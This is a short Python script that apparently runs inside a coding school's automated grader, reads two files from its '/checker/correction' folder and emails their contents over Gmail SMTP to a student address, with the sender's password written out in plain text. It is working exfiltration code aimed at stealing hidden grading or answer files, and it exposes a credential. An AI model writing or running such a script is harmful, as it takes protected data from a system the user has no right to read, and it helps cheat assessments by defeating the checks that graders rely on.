import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def read_file(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    except Exception as e:
        return f"Failed to read {file_path}: {e}"

def send_email(report, recipient_email):
    sender_email = "9534@holbertonstudents.com"
    sender_password = "ksubhijgicokabix"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "File Content Report"

    msg.attach(MIMEText(report, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    files = [
        "/checker/correction/main.sh",
        "/checker/correction/135060.py"
    ]

    report = ""
    for file in files:
        report += f"Content of {file}:\n"
        report += read_file(file)
        report += "\n\n"

    recipient_email = "9534@holbertonstudents.com"
    send_email(report, recipient_email)

